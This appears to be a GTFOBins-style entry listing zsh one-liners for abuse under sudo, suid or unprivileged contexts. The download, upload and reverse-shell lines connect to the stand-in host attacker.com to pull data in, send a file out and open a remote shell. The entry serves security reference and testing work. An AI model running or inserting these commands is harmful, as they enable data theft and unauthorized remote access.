---
type: gtfobin
name: zsh
platform: Unix
functions: [download, file-read, file-write, inherit, reverse-shell, shell, upload]
tags: [gtfobin, unix, lotl]
---

# zsh

## download

```bash
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
```
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
zsh -c 'echo "$(</path/to/input-file)"'
```
**Contexts:** sudo, suid, unprivileged

```bash
zsh -c '</path/to/input-file'
```
_This spawns a pager if run in a TTY._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
zsh -c 'echo DATA >/path/to/output-file'
```
**Contexts:** sudo, suid, unprivileged

## inherit

```bash
zsh -c '</etc/hosts'
```
**Contexts:** sudo, suid, unprivileged

## reverse-shell

```bash
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
zsh
```
**Contexts:** sudo, suid, unprivileged

## upload

```bash
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(</path/to/input-file)" >&$REPLY'
```
**Contexts:** sudo, suid, unprivileged
